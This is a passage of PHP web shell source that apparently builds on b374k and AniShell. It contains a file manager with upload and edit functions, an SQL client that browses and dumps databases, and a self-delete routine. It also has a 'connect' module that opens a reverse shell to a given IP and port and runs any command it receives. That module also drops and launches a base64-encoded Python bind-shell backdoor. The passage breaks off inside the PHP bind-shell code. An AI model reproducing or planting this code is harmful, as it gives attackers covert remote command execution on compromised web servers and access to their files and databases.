						5 => tText('ramdisk', 'RAM Disk'));
						
					foreach ($obj->Drives as $drive){
						$sBuff .= ' [<a href="#" data-path="' . $drive->Path . '/\'" onclick=';
						if ($drive->DriveType == 2) 
							$sBuff .= '"godisk(this);return false;" title="' . tText('size', 'Size') . ':' . sizecount($drive->TotalSize) . ' ' . tText('free', 'Free') . ':' . sizecount($drive->FreeSpace) . ' ' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
						else 
							$sBuff .= '"if (confirm(\'' . tText('derror', 'Make sure that disk is avarible, otherwise an error may occur.') . '\')) godisk(this);return false;" title="' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
					}
				}
            } else {
				foreach (range('A', 'Z') as $letter)
					if (@is_readable("{$letter}:\\")) 
						$sBuff .= ' [' . mLink("{$letter}:", 'godisk(this)', "data-path='{$letter}:\\'") . '] ';
			}
			$sBuff .= '<br>';
        }

		$sBuff .= tText('fmso', 'Show only') . ': <b>' . (isset($p['fm_mode']) ? $p['fm_mode'] : tText('all', 'All')) . '</b> ' .
			tText('fmow', 'Only writable') . ': <b>' . (isset($p['fm_onlyW']) ? tText('yes', 'yes') : tText('no', 'no')) . '</b> ' .
			tText('fmrl', 'Recursive listing') . ': <b>' . (isset($p['fm_rec']) ? tText('yes', 'yes') : tText('no', 'no')) . '</b><br>' .
			mLink(tText('webroot', 'WebRoot'), 'godisk(this)', "data-path='{$_SERVER['DOCUMENT_ROOT']}'") . ' | ' .
			mLink(tText('createdir', 'Create directory'), 'showUI("cdir", this)') . ' | ' .
			mLink(tText('createfile', 'Create file'), 'showUI("cfile", this)') . ' | ' .
			mLink(tText('upload', 'Upload'), 'up()') . ' | ' .
			mLink(tText('showfmextras', 'Show extra tools'), 'showFMExtras()') . '<br></td></tr></table><br>';

		if (is_dir($currentdir)){
			$bg = 2;
			$c = $d = 0;
			$sBuffFiles = '';
			$drf = fixRoute($_SERVER['DOCUMENT_ROOT']);
			$baseURL = str_replace(DS, '/', str_replace($drf, '', $currentdir));
			$isLinked = strncasecmp($drf, $currentdir, strlen($_SERVER['DOCUMENT_ROOT'])) === 0 ? true : false;
		
			$sBuff .= '<table id="sort" class="explore sortable">
				<thead><tr data-path="' . getUpPath($currentdir) . '" class="alt1">
				<td class="alt1 sorttable_nosort" width="5px">' . mLink('<div class="image lnk"></div>', 'godir(this, false)') . '</td>
				<td class="touch" width="60%"><b>' . tText('name', 'Name') . '</b></td>
				<td class="touch"><b>' . tText('date', 'Date') . '</b></td>
				<td class="touch"><b>' . tText('size', 'Size') . '</b></td>
				' . (! $isWIN ? '<td class="touch"><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td>' : '') . '
				<td width="120px"><b>' . tText('actions', 'Actions') . '</b></td>
				</tr></thead>
				<tbody>';
			
			foreach (fileList($p['fm_mode'], $currentdir, $config['FMLimit'], $p['pg'], isset($p['fm_onlyW']), $p['fm_find'], isset($p['fm_rec'])) as $file){
				$ft = filemtime($currentdir . $file['n']);
				if ($file['t'] === 'd') {
					$d++;
					$sBuff .= '<tr data-path="' . $file['n'] . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
						<td><input type="checkbox" value="' . $file['n'] . DS . '" name="dl[]"></td>
						<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file['n'] . '</a></td>
						<td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
						<td><a href="#" onclick="viewSize(this);return false;">[?]</a></td>
						' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file['n']) . '</a>&nbsp;' . getUser($currentdir . $file['n']) . '</td>' : '') . '
						<td>
						<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
						<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
						<div onclick="ajaxLoad(\'me=file&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
						<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
						</td>
						</tr>';
				} else {
					$c++;
					$sBuffFiles .= '<tr data-path="' . $file['n'] . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
						<td><input type="checkbox" value="' . $file['n'] . '" name="dl[]"></td><td>';

					if ($currentdir . $file['n'] === __file__) $sBuffFiles .= '<div class="image php"></div><font class="my">' . $file['n'] . '</font>';
					else if($isLinked) $sBuffFiles .= showIcon($file['n']) . ' <a href="' . $baseURL . $file['n'] . '" target="_blank">' . $file['n'] . '</a>';
					else $sBuffFiles .= showIcon($file['n']) . ' ' . $file['n'];
					   
					$sBuffFiles .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
						<td>' . sizecount(filesize64($currentdir . $file['n'])) . '</td>
						' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file['n']) . '</a>&nbsp;' . getUser($currentdir . $file['n']) . '</td>' : '') . '
						<td>
						<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
						<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
						<div onclick="ajaxLoad(\'me=file&md=info&t=\' + euc(dpath(this, true)));return false;" class="image info"></div>
						<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
						<div onclick="dl(this);return false;" class="image download"></div>
						</td></tr>';
				}
			}
			
			$sBuff .= $sBuffFiles;
			unset($sBuffFiles);
			$sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
				<td width="2%">' . mCheck('chkall', '', 'CheckAll(this.form);') . '</td>
				<td>' . tText('selected', 'Selected')  . ': ' . mLink(tText('download', 'Download'), 'showUISec("comp")') . ' | ' . 
				mLink(tText('del', 'Del'), 'showUISec("rdel")') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy")') . '</td>
				<td colspan="4" align="right">
				<b>' . $d . '</b> ' . tText('dirs', 'Directories')  . ' / <b>' . $c . '</b> ' . tText('fils', 'Files') . '
				</td>
				</tr></tfoot>
				</table></form>' . mHide('base', $currentdir);
		} else
			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
		
		if ($config['FMLimit'])
			$sBuff .= genPaginator($p['pg'], ($c < $config['FMLimit'] ? $p['pg'] : -1));
	}
}

if (isset($p['me']) && $p['me'] === 'srm'){
    if ((isset($p['uc'])) && ($p['uc'] === $p['rc'])){
        if (unlink(__file__)){
            @ob_clean();
			exit('Bye ;(');
        } else
            $sBuff .= '<b>' . tText('fail', 'Fail!') . '</b><br>';
    }
	
	$r = mt_rand(1337, 9999);
	$sBuff .= '<form><b>' . tText('del', 'Del') . ': ' . __file__ . '<br><br>' . tText('reminfo', 'For confirmation enter this code') . ': ' . $r . '</b>' . 
		mHide('me', 'srm') . mHide('rc', $r) . 
		mInput('uc', '') . '&nbsp;&nbsp;&nbsp;<input type="button" value="' . tText('go', 'Go!') . '" onclick="ajaxLoad(serialize(d.forms[0]));return false;" /></form>';
}

if (isset($p['me']) && $p['me'] === 'sql'){
	# SQL
	//based on b374k by DSR!
	function sql_connect($type, $host, $user, $pass){
		if ($type === 'mysql'){
			$hosts = explode(':', $host);
			if(count($hosts)==2) $host_str = $hosts[0].':'.$hosts[1];
			else $host_str = $host;
			if(function_exists('mysqli_connect')) return @mysqli_connect($host_str, $user, $pass);
			else if(function_exists('mysql_connect')) return @mysql_connect($host_str, $user, $pass);
		} else if($type === 'mssql'){
			if(function_exists('mssql_connect')) return @mssql_connect($host, $user, $pass);
			else if(function_exists('sqlsrv_connect')){
				$coninfo = array('UID'=>$user, 'PWD'=>$pass);
				return @sqlsrv_connect($host,$coninfo);
			}
		} else if($type === 'pgsql'){
			$hosts = explode(':', $host);
			if(count($hosts)==2) $host_str = 'host='.$hosts[0].' port='.$hosts[1];
			else $host_str = 'host='.$host;
			if(function_exists('pg_connect')) return @pg_connect($host_str.' user='.$user.' password='.$pass);
		} else if($type === 'oracle'){ 
			if(function_exists('oci_connect')) return @oci_connect($user, $pass, $host); 
		} else if($type === 'sqlite3'){
			if(class_exists('SQLite3')) if(!empty($host)) return new SQLite3($host);
		} else if($type === 'sqlite'){ 
			if(function_exists('sqlite_open')) return @sqlite_open($host); 
		} else if($type === 'odbc'){ 
			if(function_exists('odbc_connect')) return @odbc_connect($host, $user, $pass);
		} else if($type === 'pdo'){
			if(class_exists('PDO')) if(!empty($host)) return new PDO($host, $user, $pass);
		}
		return false;
	}

	function sql_query($type, $query, $con){
		if ($type === 'mysql'){
			if(function_exists('mysqli_query')) return mysqli_query($con,$query);
			else if(function_exists('mysql_query')) return mysql_query($query);
		} else if($type === 'mssql'){
			if(function_exists('mssql_query')) return mssql_query($query);
			else if(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
		} else if($type === 'pgsql') return pg_query($query);
		else if($type === 'oracle') return oci_execute(oci_parse($con, $query));
		else if($type === 'sqlite3') return $con->query($query);
		else if($type === 'sqlite') return sqlite_query($con, $query);
		else if($type === 'odbc') return odbc_exec($con, $query);
		else if($type === 'pdo') return $con->query($query);
	}

	function sql_num_fields($type, $result, $con){
		if ($type === 'mysql'){
			if(function_exists('mysqli_field_count')) return mysqli_field_count($con);
			else if (function_exists('mysql_num_fields')) return mysql_num_fields($result);
		} else if($type === 'mssql'){
			if(function_exists('mssql_num_fields')) return mssql_num_fields($result);
			else if(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
		} else if($type === 'pgsql') return pg_num_fields($result);
		else if($type === 'oracle') return oci_num_fields($result);
		else if($type === 'sqlite3') return $result->numColumns();
		else if($type === 'sqlite') return sqlite_num_fields($result);
		else if($type === 'odbc') return odbc_num_fields($result);
		else if($type === 'pdo') return $result->columnCount();
	}

	function sql_field_name($type,$result,$i){
		if ($type === 'mysql'){
			if(function_exists('mysqli_fetch_fields')){
				$metadata = mysqli_fetch_fields($result);
				if(is_array($metadata)) return $metadata[$i]->name;
			} else if (function_exists('mysql_field_name')) return mysql_field_name($result,$i);
		} else if($type === 'mssql'){
			if(function_exists('mssql_field_name')) return mssql_field_name($result,$i);
			else if(function_exists('sqlsrv_field_metadata')){
				$metadata = sqlsrv_field_metadata($result);
				if(is_array($metadata)) return $metadata[$i]['Name'];
			}
		} else if($type === 'pgsql') return pg_field_name($result,$i);
		else if($type === 'oracle') return oci_field_name($result,$i+1);
		else if($type === 'sqlite3') return $result->columnName($i);
		else if($type === 'sqlite') return sqlite_field_name($result,$i);
		else if($type === 'odbc') return odbc_field_name($result,$i+1);
		else if($type === 'pdo'){
			$res = $result->getColumnMeta($i);
			return $res['name'];
		}
	}

	function sql_fetch_data($type,$result){
		if ($type === 'mysql'){
			if(function_exists('mysqli_fetch_row')) return mysqli_fetch_row($result);
			else if(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
		} else if($type === 'mssql'){
			if(function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
			else if(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
		} else if($type === 'pgsql') return pg_fetch_row($result);
		else if($type === 'oracle') return oci_fetch_row($result);
		else if($type === 'sqlite3') return $result->fetchArray(1);
		else if($type === 'sqlite') return sqlite_fetch_array($result,1);
		else if($type === 'odbc') return odbc_fetch_array($result);
		else if($type === 'pdo') return $result->fetch(2);
	}

	function sql_num_rows($type,$result){
		if ($type === 'mysql'){
			if(function_exists('mysqli_num_rows')) return mysqli_num_rows($result);
			else if(function_exists('mysql_num_rows')) return mysql_num_rows($result);
		} else if($type === 'mssql'){
			if(function_exists('mssql_num_rows')) return mssql_num_rows($result);
			else if(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
		} else if($type === 'pgsql') return pg_num_rows($result);
		else if($type === 'oracle') return oci_num_rows($result);
		else if($type === 'sqlite3'){
			$metadata = $result->fetchArray();
			if(is_array($metadata)) return $metadata['count'];
		} else if($type === 'sqlite') return sqlite_num_rows($result);
		else if($type === 'odbc') return odbc_num_rows($result);
		else if($type === 'pdo') return $result->rowCount();
	}

	function sql_close($type,$con){
		if ($type === 'mysql'){
			if(function_exists('mysqli_close')) return mysqli_close($con);
			else if(function_exists('mysql_close')) return mysql_close($con);
		} else if($type === 'mssql'){
			if(function_exists('mssql_close')) return mssql_close($con);
			else if(function_exists('sqlsrv_close')) return sqlsrv_close($con);
		} else if($type === 'pgsql') return pg_close($con);
		else if($type === 'oracle') return oci_close($con);
		else if($type === 'sqlite3') return $con->close();
		else if($type === 'sqlite') return sqlite_close($con);
		else if($type === 'odbc') return odbc_close($con);
		else if($type === 'pdo') return $con = null;
	}
	 
	/*
		function dump($table){
			if (empty($table)) return 0;
			$this->dump = array();
			$this->dump[0] = '';
			$this->dump[1] = '-- --------------------------------------- ';
			$this->dump[2] = '--  Created: ' . date("d/m/Y H:i:s");
			$this->dump[3] = '--  Database: ' . $this->base;
			$this->dump[4] = '--  Table: ' . $table;
			$this->dump[5] = '-- --------------------------------------- ';

			switch ($this->db){
				case 'MySQL':
					$this->dump[0] = '-- MySQL dump';
					if ($this->query('SHOW CREATE TABLE `' . $table . '`') != 1) return 0;
					if (! $this->get_result()) return 0;
					$this->dump[] = $this->rows[0]['Create Table'];
					$this->dump[] = '-- ------------------------------------- ';
					if ($this->query('SELECT * FROM `' . $table . '`') != 1) return 0;
					if (! $this->get_result()) return 0;
					for ($i = 0; $i < $this->num_rows; $i++){
						foreach ($this->rows[$i] as $k => $v){
							$this->rows[$i][$k] = @mysql_real_escape_string($v);
						}
						$this->dump[] = 'INSERT INTO `' . $table . '` (`' . @implode("`, `", $this->columns) . '`) VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
					}
					break;
				case 'MSSQL':
					$this->dump[0] = '## MSSQL dump';
					if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
					if (! $this->get_result()) return 0;
					for ($i = 0; $i < $this->num_rows; $i++){
						foreach ($this->rows[$i] as $k => $v){
							$this->rows[$i][$k] = @addslashes($v);
						}
						$this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
					}
					break;
				case 'PostgreSQL':
					$this->dump[0] = '## PostgreSQL dump';
					if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
					if (! $this->get_result()) return 0;
					for ($i = 0; $i < $this->num_rows; $i++){
						foreach ($this->rows[$i] as $k => $v){
							$this->rows[$i][$k] = @addslashes($v);
						}
						$this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
					}
					break;
				case 'Oracle':
					$this->dump[0] = '## ORACLE dump';
					$this->dump[] = '## under construction';
					break;
				default:
					return 0;
					break;
			}

			return 1;
		}
	*/

	if (isset($p['code'])){
		if (!isset($p['pg'])) $p['pg'] = 1;
		$start = ((int)$p['pg'] - 1) * $config['SQLLimit'];
		$oracleLimit = $start + $config['SQLLimit'];

		$sBuff = '';
		$con = sql_connect($p['type'], $p['host'], $p['user'], $p['pass']);
		foreach(explode(';', $p['code']) as $query){
			if (trim($query) !== ''){
				$query = str_replace(array('{start}', '{limit}', '{oraclelimit}'), array($start, $config['SQLLimit'], $oracleLimit), $query);
				$sBuff .= '<hr /><p><b>' . tText('sq8', 'Executed') . ':</b> ' . hsc($query) . ';&nbsp;&nbsp;';
				$res = sql_query($p['type'], $query, $con);
				if ($res !== false && !is_bool($res)){
					$pag = genPaginator($p['pg'], -1, false) . '<br>';
					$sBuff .= "<b>[ ok ]</b></p><br>{$pag}<table id='sort' class='explore sortable' style='width:100%;'><tr>";
					
					$t = sql_num_fields($p['type'], $res, $con);
					for ($i = 0; $i < $t; $i++)
						$sBuff .= '<th class="touch">' . @hsc(sql_field_name($p['type'], $res, $i)) . '</th>';
					$sBuff .= '</tr>';
					
					while($rows = sql_fetch_data($p['type'], $res)){
						$sBuff .= '<tr>';
						foreach($rows as $r)
							$sBuff .= '<td>' . @hsc($r) . '</td>';
						$sBuff .= '</tr>';
					}
					
					$sBuff .= "</table><br>{$pag}";
				} else
					$sBuff .= '<b>[ ERROR ]</b></p><br>';
			}
		}
		
		sAjax($sBuff);
	} else if (isset($p['host'])){
		$con = sql_connect($p['type'], $p['host'], $p['user'], $p['pass']);
		if ($con !== false){
			$sBuff .= '<form>' .
				mHide('me', 'sql') . mHide('type', $p['type']) . 
				mHide('host', $p['host']) . mHide('port', $p['port']) . 
				mHide('user', $p['user']) . mHide('pass', $p['pass']) . '
				</form><textarea id="code" name="code" class="bigarea" style="height: 100px;"></textarea>
				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(&quot;code&quot;).value)') . '&nbsp;&nbsp;
				' . tText('sq4', 'Separate multiple commands with a semicolon') . ' <span>[ ; ]</span></p><br>
				<table class="border" style="padding:0;"><tbody>
				<tr><td id="dbNav" class="colFit borderright" style="vertical-align:top;">';
				
			if (($p['type']!=='pdo') && ($p['type']!=='odbc')){
				if ($p['type']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
				else if ($p['type']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
				else if ($p['type']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
				else if ($p['type']==='sqlite' || $p['type']==='sqlite3') $showdb = "SELECT '{$p['host']}'";
				else $showdb = 'SHOW DATABASES'; //mysql

				$res = sql_query($p['type'], $showdb, $con);
				if ($res !== false){
					$bg = 0;
					while($rowarr = sql_fetch_data($p['type'], $res)){
						foreach($rowarr as $rows){
							$sBuff .= '<p class="touch notif ' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '" onclick=\'toggle("db_'.$rows.'")\'>'.$rows.'</p><div class="uiinfo" id="db_'.$rows.'"><table>';

							if($p['type']==='mssql') $showtbl = "SELECT name FROM {$rows}..sysobjects WHERE xtype = 'U'";
							else if($p['type']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='{$rows}'";
							else if($p['type']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='{$rows}'";
							else if($p['type']==='sqlite' || $p['type']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
							else $showtbl = "SHOW TABLES FROM {$rows}"; //mysql

							$res_t = sql_query($p['type'], $showtbl, $con);
							if ($res_t != false){
								while($tablearr = sql_fetch_data($p['type'], $res_t)){
									foreach($tablearr as $tables){
										if ($p['type']==='mssql') $dumptbl = "SELECT TOP 100 * FROM {$rows}..{$tables}"; //TODO
										else if ($p['type']==='pgsql') $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {limit} OFFSET {start}";
										else if ($p['type']==='oracle') $dumptbl = "SELECT * FROM {$rows}.{$tables} WHERE ROWNUM BETWEEN {start} AND (oraclelimit);";
										else if ($p['type']==='sqlite' || $p['type']==='sqlite3') $dumptbl = "SELECT * FROM {$tables} LIMIT {start}, {limit}";
										else $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {start}, {limit}"; //mysql
											
										$sBuff .= '<tr><td><a href="#" onclick="dbexec(\'' . $dumptbl . '\');return false;">' . $tables . '</a></td></tr>';
									}
								}
							}
							$sBuff .= '</table></div>';
						}
					}
				}
			}

			$sBuff .= '</td>
				<td id="dbRes" style="vertical-align:top;width:100%;padding:0 10px;"></td>
				</tr></tbody></table>';
			if (isset($p['sqlinit'])) $sBuff .= mHide('jseval', 'dbhistory("s");');
			
			sql_close($p['type'], $con);
		} else
			$sBuff .= sDialog('Unable to connect to database');
	} else {
		$sqllist = array();
		if (function_exists('mysql_connect') || function_exists('mysqli_connect')) $sqllist['mysql'] = 'MySQL [using mysql_* or mysqli_*]';
		if (function_exists('mssql_connect') || function_exists('sqlsrv_connect')) $sqllist['mssql'] = 'MsSQL [using mssql_* or sqlsrv_*]';
		if (function_exists('pg_connect')) $sqllist['pgsql'] = 'PostgreSQL [using pg_*]';
		if (function_exists('oci_connect]')) $sqllist['oracle'] = 'Oracle [using oci_*]';
		if (function_exists('sqlite_open')) $sqllist['sqlite'] = 'SQLite [using sqlite_*]';
		if (class_exists('SQLite3')) $sqllist['sqlite3'] = 'SQLite3 [using class SQLite3]';
		if (function_exists('odbc_connect')) $sqllist['odbc'] = 'ODBC [using odbc_*]';			
		if (class_exists('PDO')) $sqllist['pdo'] = 'PDO [using class PDO]';
		
		$sBuff .= '
			<div class="table floatCenter" style="width: 50%;">
				<div class="table-row">
					<div class="table-col floatCenter"><h2>' . tText('sql', 'SQL') . '</h2></div>
				</div>
				<div class="table-row" style="text-align:left;">
					<div class="table-col"><form>' .
					mInput('host', '', '<span id="sh">' . tText('sq7', 'Host') . '</span>', 1, '', 'style="width: 99%;"') . 
					'<span id="su">' . mInput('user', '', tText('sq0', 'Username'), 1, '', 'style="width: 99%;"')  . '</span>' . 
					'<span id="sp">' . mInput('pass', '', tText('sq1', 'Password'), 1, '', 'style="width: 99%;"')  . '</span>' . 
					'<span id="so">' . mInput('port', '', tText('sq2', 'Port (optional)'), 1, '', 'style="width: 99%;"') . '</span>' .
					mSelect('type', $sqllist, false, false, 'dbengine(this)', tText('sq3', 'Engine')) . 
					mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.getElementById("type"));dbhistory("v");') . 
					'<center>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]));', 1) . '</center>' .
					'</form></div>
			</div>';
	}
}

if (isset($p['me']) && $p['me'] === 'connect'){ //Basada en AniShell
	if (@sValid($p['ip']) && sValid($p['port'])){
		$sBuff .= '<p>The Program is now trying to connect!</p>';
		$ip = $p['ip'];
		$port = $p['port'];
		$sockfd = fsockopen($ip, $port, $errno, $errstr);
		if ($errno != 0){
			$sBuff .= "<font color='red'><b>$errno</b>: $errstr</font>";
		} else if (!$sockfd){
			$result = '<p>Fatal: An unexpected error was occured when trying to connect!</p>';
		} else {
			$len = 1500;
			fputs($sockfd, execute('uname -a') . "\n");
			fputs($sockfd, execute('pwd') . "\n");
			fputs($sockfd, execute('id') . "\n\n");
			fputs($sockfd, execute('time /t & date /T') . "\n\n");

			while (! feof($sockfd)) {
				fputs($sockfd, '(Shell)[$]> ');
				fputs($sockfd, "\n" . execute(fgets($sockfd, $len)) . "\n\n");
			}
			fclose($sockfd);
		}
	} else if (@(sValid($p['port'])) && (sValid($p['passwd'])) && (sValid($p['mode']))){
			$address = '127.0.0.1';
			$port = $p['port'];
			$pass = $p['passwd'];

			if ($p['mode'] === 'Python'){
				$Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";
				$bindname = 'bind.py';
				$fd = fopen($bindname, 'w');
				if ($fd){
					fwrite($fd, base64_decode($Python_CODE));
					if ($isWIN){
						$sBuff .= '[+] OS Detected = Windows';
						execute('start bind.py');
						$pattern = 'python.exe';
						$list = execute('TASKLIST');
					} else {
						$sBuff .= '[+] OS Detected = Linux';
						execute('chmod +x bind.py ; ./bind.py');
						$pattern = $bindname;
						$list = execute('ps -aux');
					}

					if (preg_match("/$pattern/", $list))
						$sBuff .= '<p class="alert_green">Process Found Running! Backdoor Setuped Successfully</p>';
					else
						$sBuff .= '<p class="alert_red">Process Not Found Running! Backdoor Setup FAILED</p>';

					$sBuff .= "<br/><br/>\n<b>Task List :-</b> <pre>\n$list</pre>";
				}
			}
	} else if (@$p['mode'] === 'PHP'){
		if (function_exists("socket_create")){
			$sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);// Create a TCP Stream socket
			if (socket_bind($sockfd, $address, $port) == false)
				$sBuff .= "Cant Bind to the specified port and address!";
			socket_listen($sockfd, 17);// Start listening for connections
			$client = socket_accept($sockfd);//Accept incoming requests and handle them as child processes
